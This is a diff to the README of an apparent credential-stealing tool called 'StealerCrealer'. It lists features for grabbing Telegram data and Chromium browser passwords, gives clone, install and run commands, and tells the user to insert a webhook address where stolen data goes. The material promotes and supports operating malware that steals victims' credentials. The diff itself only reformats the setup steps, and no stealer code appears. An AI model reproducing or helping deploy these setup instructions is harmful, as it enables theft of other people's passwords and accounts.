@@ -16,22 +16,21 @@
 » Grab Telegram
 
 » Grab chromium based Passwords
+ 
+ » INSTALL
+ » CMD
+
+`https://www.python.org/ftp/python/3.10.3/python-3.10.3-embed-amd64.zip` 
 
 
-## Setup:
-Download Python
-https://www.python.org/ftp/python/3.10.3/python-3.10.3-embed-amd64.zip
-CMD
+`git clone https://github.com/PanEditor/StealerCrealer`
 
- 
-pip install -r requirements.txt
- 
-git clone https://github.com/PanEditor/StealerCrealer
- 
-Python StealerCrealer.py
- 
- 
- 
+
+`pip install -r requirements.txt`
+
+`Python StealerCrealer.py`
+
+
  
 First paste and save your webhook address instead of `"WEBHOOK HERE"`
 
